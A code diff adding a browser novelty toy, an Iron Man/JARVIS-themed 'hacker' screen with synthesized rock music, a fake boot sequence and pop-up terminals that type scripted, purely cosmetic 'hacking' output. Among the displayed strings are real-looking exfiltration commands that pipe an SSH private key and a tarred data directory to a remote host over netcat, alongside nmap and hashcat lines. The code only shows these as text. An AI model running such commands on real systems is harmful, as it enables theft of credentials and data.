+      const logEl      = root.querySelector('[data-log]');
+      const tickerEl   = root.querySelector('[data-ticker]');
+      const centerLbl  = root.querySelector('[data-center-lbl]');
+      const overlayEl  = root.querySelector('[data-overlay]');
+      const overlayTxt = root.querySelector('[data-overlay-text]');
+      const centerEl   = root.querySelector('.stark-center');
+      const reactorEl  = root.querySelector('[data-reactor]');
+      const radarEl    = root.querySelector('.stark-radar');
+
+      let audioCtx   = null;
+      let musicGain  = null;
+      let musicLoop  = null;
+      let stage      = 'pre';
+      let stopped    = false;
+      let didFull    = false;
+      const timers   = new Set();
+
+      function after(fn, d) {
+        const id = setTimeout(() => { timers.delete(id); if (!stopped) fn(); }, d);
+        timers.add(id); return id;
+      }
+      function every(fn, d) {
+        const id = setInterval(() => { if (!stopped) fn(); }, d);
+        timers.add(id); return id;
+      }
+      function randInt(lo, hi) { return Math.floor(lo + Math.random() * (hi - lo + 1)); }
+      function pick(arr) { return arr[randInt(0, arr.length - 1)]; }
+      function clockStr() {
+        const d = new Date();
+        return [d.getHours(), d.getMinutes(), d.getSeconds()]
+          .map(x => String(x).padStart(2, '0')).join(':');
+      }
+
+      /* ── Audio ─────────────────────────────────── */
+      function ensureAudio() {
+        if (audioCtx) {
+          if (audioCtx.state === 'suspended') audioCtx.resume().catch(() => {});
+          return audioCtx;
+        }
+        const AC = window.AudioContext || window.webkitAudioContext;
+        if (!AC) return null;
+        try { audioCtx = new AC(); } catch (_) { return null; }
+        return audioCtx;
+      }
+
+      function makeDistortionCurve(k) {
+        const n = 2048;
+        const curve = new Float32Array(n);
+        for (let i = 0; i < n; i++) {
+          const x = (i * 2) / n - 1;
+          curve[i] = ((3 + k) * x * (Math.PI / 180)) / (Math.PI + k * Math.abs(x));
+        }
+        return curve;
+      }
+
+      function startRock() {
+        const ctx = ensureAudio();
+        if (!ctx) return;
+
+        const master = ctx.createGain();
+        master.gain.value = 0.0001;
+        master.gain.exponentialRampToValueAtTime(0.28, ctx.currentTime + 1.2);
+
+        const dist = ctx.createWaveShaper();
+        dist.curve = makeDistortionCurve(55);
+        dist.oversample = '4x';
+
+        const cab = ctx.createBiquadFilter();
+        cab.type = 'lowpass';
+        cab.frequency.value = 2400;
+        cab.Q.value = 0.7;
+
+        dist.connect(cab); cab.connect(master); master.connect(ctx.destination);
+        musicGain = master;
+
+        const secPerEighth = 60 / RIFF_BPM / 2;
+        const riffLen = RIFF.length * secPerEighth;
+
+        function chord(freq, when, dur) {
+          [freq, freq * 1.4983, freq * 2.0].forEach((f, i) => {
+            const osc = ctx.createOscillator();
+            osc.type = 'sawtooth';
+            osc.frequency.value = f;
+            const g = ctx.createGain();
+            g.gain.setValueAtTime(0.0001, when);
+            g.gain.exponentialRampToValueAtTime(i === 0 ? 0.28 : 0.18, when + 0.01);
+            g.gain.exponentialRampToValueAtTime(0.0001, when + dur * 0.95);
+            osc.connect(g); g.connect(dist);
+            osc.start(when); osc.stop(when + dur);
+          });
+        }
+        function kick(when) {
+          const osc = ctx.createOscillator();
+          osc.type = 'sine';
+          osc.frequency.setValueAtTime(140, when);
+          osc.frequency.exponentialRampToValueAtTime(45, when + 0.18);
+          const g = ctx.createGain();
+          g.gain.setValueAtTime(0.0001, when);
+          g.gain.exponentialRampToValueAtTime(0.5, when + 0.005);
+          g.gain.exponentialRampToValueAtTime(0.0001, when + 0.22);
+          osc.connect(g); g.connect(master);
+          osc.start(when); osc.stop(when + 0.25);
+        }
+        function schedulePattern(t0) {
+          for (let i = 0; i < RIFF.length; i++) {
+            chord(RIFF[i], t0 + i * secPerEighth, secPerEighth * 0.9);
+          }
+          for (let b = 0; b < RIFF.length / 2; b++) {
+            kick(t0 + b * 2 * secPerEighth);
+          }
+        }
+
+        let nextStart = ctx.currentTime + 0.08;
+        schedulePattern(nextStart);
+        nextStart += riffLen;
+
+        musicLoop = setInterval(() => {
+          if (stopped || !audioCtx) return;
+          const now = audioCtx.currentTime;
+          while (nextStart < now + 1.0) {
+            schedulePattern(nextStart);
+            nextStart += riffLen;
+          }
+        }, 250);
+      }
+
+      function stopRock() {
+        if (musicLoop) { clearInterval(musicLoop); musicLoop = null; }
+        if (audioCtx && musicGain) {
+          const now = audioCtx.currentTime;
+          try {
+            musicGain.gain.cancelScheduledValues(now);
+            musicGain.gain.setValueAtTime(musicGain.gain.value, now);
+            musicGain.gain.linearRampToValueAtTime(0.0001, now + 0.35);
+          } catch (_) {}
+        }
+        const ctx = audioCtx;
+        audioCtx = null; musicGain = null;
+        if (ctx) {
+          setTimeout(() => { try { ctx.close(); } catch (_) {} }, 450);
+        }
+      }
+
+      function zap(freq, dur) {
+        if (!audioCtx) return;
+        const ctx = audioCtx;
+        const now = ctx.currentTime;
+        const osc = ctx.createOscillator();
+        osc.type = 'square';
+        osc.frequency.setValueAtTime(freq, now);
+        osc.frequency.exponentialRampToValueAtTime(freq * 0.4, now + dur);
+        const g = ctx.createGain();
+        g.gain.setValueAtTime(0.0001, now);
+        g.gain.exponentialRampToValueAtTime(0.14, now + 0.005);
+        g.gain.exponentialRampToValueAtTime(0.0001, now + dur);
+        const hp = ctx.createBiquadFilter();
+        hp.type = 'highpass'; hp.frequency.value = 400;
+        osc.connect(g); g.connect(hp); hp.connect(ctx.destination);
+        osc.start(now); osc.stop(now + dur + 0.05);
+      }
+
+      /* ── Stages ────────────────────────────────── */
+      function setStage(s) {
+        stage = s;
+        host.setAttribute('data-stage', s);
+        preEl.hidden  = s !== 'pre';
+        bootEl.hidden = s !== 'booting';
+        hudEl.hidden  = s !== 'hud';
+      }
+
+      async function tryFullscreen() {
+        const el = host;
+        const req = el.requestFullscreen || el.webkitRequestFullscreen;
+        if (!req) return;
+        try {
+          const p = req.call(el);
+          if (p && p.then) await p;
+          didFull = true;
+        } catch (_) { /* fall back to CSS takeover */ }
+      }
+
+      function exitFullscreen() {
+        try {
+          const ex = document.exitFullscreen || document.webkitExitFullscreen;
+          if (ex && (document.fullscreenElement || document.webkitFullscreenElement)) {
+            ex.call(document);
+          }
+        } catch (_) {}
+      }
+
+      function onFullscreenChange() {
+        const active = document.fullscreenElement || document.webkitFullscreenElement;
+        if (didFull && !active && !stopped && stage !== 'pre') {
+          window.location.hash = '#tools-all';
+        }
+      }
+
+      /* ── Boot ──────────────────────────────────── */
+      function runBoot() {
+        setStage('booting');
+        bootClock.textContent = clockStr();
+        every(() => bootClock.textContent = clockStr(), 1000);
+
+        bootLines.innerHTML = BOOT_LINES.map(() => `
+          <div class="stark-boot-line">
+            <span>&gt;</span><span data-t></span><span data-s></span>
+          </div>
+        `).join('');
+
+        const total = BOOT_LINES.length;
+        let idx = 0;
+
+        function advance() {
+          if (idx >= total) return finishBoot();
+          const line = BOOT_LINES[idx];
+          const row  = bootLines.children[idx];
+          const tEl  = row.querySelector('[data-t]');
+          const sEl  = row.querySelector('[data-s]');
+          let i = 0;
+          const typeStep = () => {
+            if (stopped) return;
+            if (i <= line.length) {
+              tEl.textContent = line.slice(0, i);
+              i++;
+              after(typeStep, line[i - 1] === '.' ? 2 : 4 + Math.random() * 6);
+            } else {
+              sEl.textContent = '[ OK ]';
+              row.classList.add('stark-boot-line-done');
+              idx++;
+              const pct = Math.round((idx / total) * 100);
+              bootFill.style.width = pct + '%';
+              bootPct.textContent  = String(pct).padStart(2, '0') + '%';
+              zap(700 + idx * 38, 0.05);
+              after(advance, 30 + Math.random() * 50);
+            }
+          };
+          typeStep();
+        }
+        advance();
+      }
+
+      function finishBoot() {
+        zap(320, 0.35);
+        after(() => {
+          if (stopped) return;
+          setStage('hud');
+          enterHud();
+        }, 260);
+      }
+
+      /* ── HUD ───────────────────────────────────── */
+      function pushLog(text) {
+        const row = document.createElement('div');
+        row.className = 'stark-log-row';
+        row.innerHTML = `<span>${clockStr()}</span><span></span>`;
+        row.lastChild.textContent = text;
+        logEl.prepend(row);
+        while (logEl.children.length > 30) logEl.lastChild.remove();
+      }
+
+      function randomHackLine() {
+        return `${pick(HACK_VERBS)} ${pick(HACK_TARGETS)}`;
+      }
+
+      /* ── Hijack terminals ──────────────────────── */
+      const T_HOSTS = [
+        'stark-mainframe', 'jarvis-core-01', 'shield-prime', 'roxxon-gateway',
+        'pentagon-sub7', 'hammer-ind-proxy', 'darkweb.node7', 'nyc-grid-ops', 'oscorp-api'
+      ];
+      const T_IPS = [
+        '10.42.0.13', '52.84.12.9', '172.16.99.1',
+        '192.168.42.7', '104.18.32.7', '203.0.113.42'
+      ];
+      const T_USERS = ['root', 'tony', 't.stark', 'admin', 'jarvis', 'ops'];
+
+      function randHex(n) {
+        const s = '0123456789abcdef';
+        let out = '';
+        for (let i = 0; i < n; i++) out += s[randInt(0, 15)];
+        return out;
+      }
+      function newTargetCtx() {
+        return {
+          host: pick(T_HOSTS),
+          ip:   pick(T_IPS),
+          user: pick(T_USERS)
+        };
+      }
+
+      function buildScript(c) {
+        const ALL = [
+          [ // ssh + key theft
+            { t: 'cmd',   text: `ssh ${c.user}@${c.host}` },
+            { t: 'out',   cls: 'dim', text: `authenticity of '${c.host} (${c.ip})' unknown.` },
+            { t: 'out',   cls: 'dim', text: `fingerprint SHA256:${randHex(16)}...` },
+            { t: 'out',   text: `${c.user}@${c.host}'s password: ••••••••` },
+            { t: 'pause', ms: 120 },
+            { t: 'out',   cls: 'ok',  text: `> auth OK · uid=0(${c.user})` },
+            { t: 'cmd',   text: `find / -name "*.key" 2>/dev/null | head -3` },
+            { t: 'rapid', lines: ['/etc/ssl/stark.key', '/srv/vault/.priv', '/root/.ssh/id_rsa'] },
+            { t: 'cmd',   text: `cat /root/.ssh/id_rsa | nc ${c.ip} 9001` },
+            { t: 'out',   cls: 'ok',  text: `[✓] 2048-bit RSA key exfiltrated` }
+          ],
+          [ // port scan
+            { t: 'cmd',   text: `nmap -sS -A ${c.ip}` },
+            { t: 'out',   cls: 'dim', text: `starting scan · 1 host` },
+            { t: 'out',   cls: 'dim', text: `host up · 0.002s latency` },
+            { t: 'out',   text: `22/tcp   open  ssh      OpenSSH 8.9` },
+            { t: 'out',   text: `80/tcp   open  http     nginx 1.25` },
+            { t: 'out',   text: `443/tcp  open  https    nginx 1.25` },
+            { t: 'out',   text: `3306/tcp open  mysql    MySQL 8.0.32` },
+            { t: 'out',   text: `8080/tcp open  proxy    Stark-Proxy 3.2` },
+            { t: 'out',   cls: 'warn', text: `[!] 5 services exposed` }
+          ],
+          [ // exploit
+            { t: 'cmd',   text: `./exploit --target=${c.host}` },
+            { t: 'out',   cls: 'dim',  text: `[*] probing ${c.ip}` },
+            { t: 'out',   cls: 'dim',  text: `[*] fingerprint: Stark-OS v4.17` },
+            { t: 'out',   cls: 'meta', text: `[*] payload: MK-XLII-NANO` },
+            { t: 'out',   cls: 'meta', text: `[*] bypassing W^X ...` },
+            { t: 'out',   cls: 'ok',   text: `[+] heap spray   ✓` },
+            { t: 'out',   cls: 'ok',   text: `[+] rop chain    ✓` },
+            { t: 'out',   cls: 'ok',   text: `[+] shellcode    ✓` },
+            { t: 'out',   cls: 'ok',   text: `[✓] shell: uid=0(root)` }
+          ],
+          [ // exfil
+            { t: 'cmd',   text: `tar czf - /var/data | nc ${c.ip} 4444` },
+            { t: 'out',   text: `[1/6] schematics.mkv` },
+            { t: 'out',   text: `[2/6] weapons/repulsor.pdf` },
+            { t: 'out',   text: `[3/6] keys/master.kdbx` },
+            { t: 'out',   text: `[4/6] personnel.csv` },
+            { t: 'out',   text: `[5/6] mk42-firmware.bin` },
+            { t: 'out',   text: `[6/6] video-dump.tar` },
+            { t: 'progress', label: 'streaming', dur: 700 },
+            { t: 'out',   cls: 'ok', text: `[✓] 3.4 GiB exfiltrated` }
+          ],
+          [ // trace
+            { t: 'cmd',   text: `trace-route --mask` },
+            { t: 'out',   cls: 'dim', text: `> hop 1 edge.node.local` },
+            { t: 'out',   cls: 'dim', text: `> hop 2 tor-relay-0xF4A` },
+            { t: 'out',   cls: 'dim', text: `> hop 3 vpn-shield-42` },
+            { t: 'out',   cls: 'dim', text: `> hop 4 deep-ocean-sat` },
+            { t: 'out',   cls: 'dim', text: `> hop 5 lunar-relay-7` },
+            { t: 'out',   cls: 'warn', text: `> hop 6 ??? — trace lost` },
+            { t: 'out',   cls: 'ok',  text: `[✓] identity concealed` }
+          ],
+          [ // credential crack
+            { t: 'cmd',   text: `hashcat -m 1800 target.shadow wordlist.txt` },
+            { t: 'out',   cls: 'dim', text: `session · sha512crypt · 4 hashes` },
+            { t: 'progress', label: 'cracking', dur: 900 },
+            { t: 'rapid', cls: 'ok', lines: [
+              `recovered (1/4) stark1943`,
+              `recovered (2/4) pepperP!`,
+              `recovered (3/4) jarvisBoot`,
+              `recovered (4/4) marko3000`
+            ]},
+            { t: 'out', cls: 'ok', text: `[✓] all credentials cracked` }
+          ],
+          [ // firmware swap
+            { t: 'cmd',   text: `./flash --target=${c.host} --img=stark-backdoor.bin` },
+            { t: 'out',   cls: 'warn', text: `[!] erasing OEM bootrom` },
+            { t: 'progress', label: 'writing flash', dur: 900 },
+            { t: 'out',   cls: 'ok', text: `[✓] firmware replaced · reboot queued` },
+            { t: 'cmd',   text: `reboot --force` },
+            { t: 'out',   cls: 'dim', text: `connection to ${c.host} closed.` }
+          ],
+          [ // packet sniff
+            { t: 'cmd',   text: `tcpdump -i eth0 host ${c.ip}` },
+            { t: 'out',   cls: 'dim', text: `listening on eth0 · snap 262144 bytes` },
+            { t: 'rapid', cls: 'dim', lines: [
+              `${c.ip}.443 > local.54220 TLS flags=[P.] len=1460`,
+              `${c.ip}.443 > local.54220 TLS flags=[.]  ack 1461`,
+              `local.54220 > ${c.ip}.443 TLS flags=[P.] len=520`,
+              `${c.ip}.22  > local.42014 SSH flags=[P.] len=176`,
+              `${c.ip}.22  > local.42014 SSH flags=[P.] len=48`
+            ]},
+            { t: 'out', cls: 'meta', text: `[*] extracting session cookies ...` },
+            { t: 'out', cls: 'ok',   text: `[✓] captured 12 session tokens` }
+          ]
+        ];
+        return pick(ALL);
+      }
+
+      const MAX_TERMS = 5;
+      let termZ = 5;
+      const termsActive = new Set();
+
+      function closeTerminal(h, immediate) {
+        if (h.closed) return;
+        h.closed = true;
+        // Remove from the active set synchronously — leaving it here until
+        // the removal setTimeout fires would let a spammed spawnTerminal
+        // spin forever trying to cull the same already-closed handle.
+        termsActive.delete(h);
+        h.timers.forEach(id => { clearTimeout(id); clearInterval(id); });
+        h.timers.clear();
+        h.el.classList.add('stark-term-closing');
+        const d = immediate ? 90 : 280;
+        setTimeout(() => {
+          if (h.el && h.el.parentNode) h.el.parentNode.removeChild(h.el);
+        }, d);
+      }
+
+      function spawnTerminal() {
+        // Cull oldest handles first — guarded with a hard cap in case the
+        // set somehow can't shrink (shouldn't happen after the sync delete).
+        let guard = 20;
+        while (termsActive.size >= MAX_TERMS && guard-- > 0) {
+          const oldest = termsActive.values().next().value;
+          if (!oldest) break;
+          closeTerminal(oldest, true);
+        }
+        const c = newTargetCtx();
+        const title = pick([
+          `ssh ${c.user}@${c.host}`,
+          `root@${c.host}:~#`,
+          `${c.user}@${c.ip}`,
+          `xterm · ${c.host}`,
+          `C2://${c.host}`,
+          `tcpdump · ${c.ip}`
+        ]);
+
+        const el = document.createElement('div');
+        el.className = 'stark-term';
+        el.innerHTML = `
+          <div class="stark-term-bar">
+            <div class="stark-term-dots"><i></i><i></i><i></i></div>
+            <span class="stark-term-title"></span>
+            <span style="width:27px;"></span>
+          </div>
+          <div class="stark-term-body"></div>
+        `;
+        el.querySelector('.stark-term-title').textContent = title;
+
+        const W = hudEl.clientWidth || 1000;
+        const H = hudEl.clientHeight || 600;
+        const w = Math.min(340, W - 24);
+        const maxL = Math.max(8, W - w - 16);
+        const maxT = Math.max(72, H - 260 - 70);
+        el.style.left  = randInt(8, maxL) + 'px';
+        el.style.top   = randInt(70, maxT) + 'px';
+        el.style.width = w + 'px';
+        termZ = Math.min(termZ + 1, 9970);
+        el.style.zIndex = termZ;
+
+        hudEl.appendChild(el);
+
+        const body = el.querySelector('.stark-term-body');
+        const h = { el, body, timers: new Set(), closed: false };
+        termsActive.add(h);
+
+        function hAfter(fn, d) {
+          const id = setTimeout(() => {
+            h.timers.delete(id);
+            if (!h.closed && !stopped) fn();
+          }, d);
+          h.timers.add(id);
+          return id;
+        }
+
+        function append(text, cls) {
+          if (h.closed) return null;
+          const line = document.createElement('div');
+          line.className = 'stark-term-line' + (cls ? ' stark-tl-' + cls : '');
+          line.textContent = text;
+          body.appendChild(line);
+          while (body.children.length > 40) body.firstChild.remove();
+          body.scrollTop = body.scrollHeight;
+          return line;
+        }
+
+        const script = buildScript(c);
+        let i = 0;
+        function next() {
+          if (h.closed) return;
+          if (i >= script.length) {
+            hAfter(() => closeTerminal(h, false), 1400);
+            return;
+          }
+          const step = script[i++];
+          if (step.t === 'cmd') {
+            const line = document.createElement('div');
+            line.className = 'stark-term-line stark-tl-cmd';
+            line.innerHTML =
+              '<span class="stark-term-prompt">$</span>' +
+              '<span data-typed></span>' +
+              '<span class="stark-term-caret"></span>';
+            body.appendChild(line);
+            body.scrollTop = body.scrollHeight;
+            const target = line.querySelector('[data-typed]');
+            let k = 0;
+            const typeChar = () => {
+              if (h.closed) return;
+              if (k <= step.text.length) {
+                target.textContent = step.text.slice(0, k);
+                k++;
+                hAfter(typeChar, 8 + Math.random() * 16);
+              } else {
+                const caret = line.querySelector('.stark-term-caret');
+                if (caret) caret.remove();
+                hAfter(next, 80);
+              }
+            };
+            typeChar();
+          } else if (step.t === 'out') {
+            append(step.text, step.cls);
+            hAfter(next, 40 + Math.random() * 60);
+          } else if (step.t === 'rapid') {
+            let j = 0;
+            const emit = () => {
+              if (h.closed) return;
+              if (j < step.lines.length) {
+                append(step.lines[j++], step.cls);
+                hAfter(emit, 30 + Math.random() * 35);
+              } else hAfter(next, 70);
+            };
+            emit();
+          } else if (step.t === 'progress') {
+            const dur = step.dur || 800;
+            const start = performance.now();
+            const line = append('[          ] 00% ' + (step.label || ''), 'meta');
+            const tick = () => {
+              if (h.closed || !line) return;
+              const t = Math.min(1, (performance.now() - start) / dur);
+              const bars = Math.round(t * 10);
+              const pct = Math.round(t * 100);
+              line.textContent =
+                '[' + '█'.repeat(bars) + ' '.repeat(10 - bars) + '] ' +
+                String(pct).padStart(2, '0') + '% ' + (step.label || '');
+              if (t < 1) hAfter(tick, 40);
+              else hAfter(next, 100);
+            };
+            tick();
+          } else if (step.t === 'pause') {
+            hAfter(next, step.ms || 150);
+          } else {
+            next();
+          }
+        }
+        next();
+
+        zap(1800 + randInt(-400, 400), 0.04);
+        pushLog(title.toUpperCase());
+      }
+
+      function enterHud() {
+        hudClock.textContent = clockStr();
+        every(() => hudClock.textContent = clockStr(), 1000);
+
+        pushLog('JARVIS ONLINE');
+        pushLog('ALL SYSTEMS NOMINAL');
+        pushLog('AWAITING INPUT');
+
+        const vitals = { cpu: 12, mem: 34, net: 71, pwr: 97 };
+        every(() => {
+          Object.keys(vitals).forEach(k => {
+            vitals[k] = Math.max(5, Math.min(99, vitals[k] + (Math.random() - 0.5) * 6));
+            const bar = root.querySelector(`[data-bar="${k}"]`);
+            const val = root.querySelector(`[data-val="${k}"]`);
+            if (bar) bar.style.width = vitals[k] + '%';
+            if (val) val.textContent = Math.round(vitals[k]) + '%';
+          });
+        }, 900);
+
+        const tickerLines = [];
+        for (let i = 0; i < 8; i++) tickerLines.push(randomHackLine());
+        tickerEl.textContent = tickerLines.join('  ·  ');
+        every(() => {
+          tickerLines.push(randomHackLine());
+          if (tickerLines.length > 30) tickerLines.shift();
+          tickerEl.textContent = tickerLines.join('  ·  ');
+        }, 1200);
+
+        document.addEventListener('keydown', onHudKey);
+        hudEl.addEventListener('pointerdown', onHudPointer);
+      }
+
+      /* ── Effects (random key / tap) ────────────── */
+      function effFlash() {
+        host.classList.add('fx-flash');
+        after(() => host.classList.remove('fx-flash'), 220);
+        pushLog('COMMAND ACCEPTED');
+      }
+      function effHack() {
+        const line = randomHackLine();
+        pushLog(line);
+        centerLbl.textContent = line;
+        centerLbl.classList.add('stark-center-hot');
+        after(() => centerLbl.classList.remove('stark-center-hot'), 900);
+      }
+      function effTarget() {
+        const dot = document.createElement('div');
+        dot.className = 'stark-target';
+        dot.style.left = randInt(20, 80) + '%';
+        dot.style.top  = randInt(20, 80) + '%';
+        centerEl.appendChild(dot);
+        after(() => dot.remove(), 1400);
+        pushLog('TARGET ACQUIRED');
+        zap(1400, 0.18);
+      }
+      function effShake() {
+        host.classList.add('fx-shake');
+        after(() => host.classList.remove('fx-shake'), 500);
+        pushLog('IMPACT DETECTED');
+      }
+      function effScan() {
+        host.classList.add('fx-scan');
+        after(() => host.classList.remove('fx-scan'), 1000);
+        pushLog('BIOMETRIC SCAN COMPLETE');
+      }
+      function effGlitch() {
+        host.classList.add('fx-glitch');
+        after(() => host.classList.remove('fx-glitch'), 400);
+        pushLog('SIGNAL INSTABILITY');
+      }
+      function effReactor() {
+        reactorEl.classList.add('fx-pulse');
+        after(() => reactorEl.classList.remove('fx-pulse'), 800);
+        zap(560, 0.3);
+        pushLog('ARC REACTOR SPIKE');
+      }
+      function effBlip() {
+        const b = document.createElement('span');
+        b.className = 'stark-radar-blip fx-new';
+        b.style.left = randInt(15, 85) + '%';
+        b.style.top  = randInt(15, 85) + '%';
+        radarEl.appendChild(b);
+        after(() => b.remove(), 2100);
+        pushLog('CONTACT SIGNATURE DETECTED');
+      }
+      function effOverlay() {
+        overlayTxt.textContent = pick(OVERLAY_PHRASES);
+        overlayEl.classList.add('fx-show');
+        after(() => overlayEl.classList.remove('fx-show'), 800);
+        zap(880, 0.12);
+      }
+
+      const SECONDARY_EFFECTS = [effFlash, effHack, effShake, effGlitch, effReactor, effBlip, effOverlay];
+      function runEffect() {
+        // Most keystrokes pop a new terminal — full hijack vibe.
+        // A few spill into screen FX for variety.
+        if (Math.random() < 0.72) spawnTerminal();
+        else pick(SECONDARY_EFFECTS)();
+      }
+
+      const IGNORE_KEYS = new Set([
+        'Shift', 'Control', 'Alt', 'Meta', 'CapsLock',
+        'NumLock', 'Tab', 'ContextMenu', 'Dead', 'Unidentified'
+      ]);
+      function onHudKey(e) {
+        if (e.key === 'Escape') { window.location.hash = '#tools-all'; return; }
+        if (e.ctrlKey || e.metaKey || e.altKey) return;
+        if (IGNORE_KEYS.has(e.key)) return;
+        if (stage !== 'hud') return;
+        e.preventDefault();
+        runEffect();
+      }
+      function onHudPointer(e) {
+        if (e.target.closest('[data-quit]')) return;
+        if (stage !== 'hud') return;
+        runEffect();
+      }
+
+      /* ── Wiring ────────────────────────────────── */
+      async function onStart() {
+        if (stopped) return;
+        startBtn.disabled = true;
+        host.classList.add('stark-takeover');
+        document.body.classList.add('stark-fullscreen');
+        ensureAudio();
+        zap(400, 0.15);
+        startRock();
+        await tryFullscreen();
+        runBoot();
+      }
+
+      startBtn.addEventListener('click', onStart);
+      quitBtn.addEventListener('click', () => { window.location.hash = '#tools-all'; });
+      document.addEventListener('fullscreenchange', onFullscreenChange);
+      document.addEventListener('webkitfullscreenchange', onFullscreenChange);
+
+      return function cleanup() {
+        if (stopped) return;
+        stopped = true;
+        timers.forEach(id => { clearTimeout(id); clearInterval(id); });
+        timers.clear();
+        termsActive.forEach(h => closeTerminal(h, true));
+        termsActive.clear();
+        document.removeEventListener('keydown', onHudKey);
+        document.removeEventListener('fullscreenchange', onFullscreenChange);
+        document.removeEventListener('webkitfullscreenchange', onFullscreenChange);
+        hudEl.removeEventListener('pointerdown', onHudPointer);
+        host.classList.remove('stark-takeover');
+        document.body.classList.remove('stark-fullscreen');
+        stopRock();
+        exitFullscreen();
       };
     }
 
